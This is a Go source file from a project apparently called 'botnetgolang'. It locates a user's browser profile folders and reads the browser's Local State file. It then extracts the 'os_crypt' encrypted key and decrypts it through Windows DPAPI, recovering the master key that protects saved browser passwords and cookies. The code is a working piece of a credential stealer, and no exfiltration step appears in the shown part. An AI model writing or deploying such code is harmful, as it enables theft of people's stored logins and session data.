package internal

import (
	"botnetgolang/internal/model"
	"botnetgolang/internal/pkg"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
)

var jsonData []interface{}

func FunGetProfile(browser model.BrowserPaths) *model.AllProfile {
	var result model.AllProfile

	ppp := os.Getenv("APPDATA")
	if ppp == "" {
		ppp = os.Getenv("HOME")
	}
	part := strings.Split(ppp, "\\AppData")
	ppp = part[0]

	jsonData = append(jsonData, filepath.Join(ppp, "fffff"))

	pathfolderD := filepath.Join(ppp, browser.Pa)

	textF := "108.0.0.0"
	content, err := ioutil.ReadFile(filepath.Join(pathfolderD, "Last Version"))
	if err == nil {
		textF = string(content)
	}

	alls := make([]string, 0)
	if paths, err := pkg.GetDirectoriesV2(pathfolderD); err != nil {
		fmt.Print("loi")
	} else {
		for _, value := range paths {
			alls = append(alls, value)
		}

	}

	if err != nil {
		panic(err)
	}
	// lay cac profile
	result.Alls = alls
	result.PathSource = ppp
	result.UserData = pathfolderD
	result.Version = textF

	return &result
}

func MainBL(browser model.BrowserPaths) {
	allProfile := FunGetProfile(browser)
	if len(allProfile.Alls) < 0 {
		return
	}
	textF, err := pkg.ReadTextFile(allProfile.PathSource + browser.Local)
	if err != nil {
		return
	}
	var dataC map[string]interface{}
	err = json.Unmarshal([]byte(textF), &dataC)
	if err != nil {
		return
	}

	alltt := dataC["os_crypt"].(map[string]interface{})["encrypted_key"].(string)
	tt := alltt[5:]
	fmt.Println(pkg.UnprotectData([]byte(tt)))

}
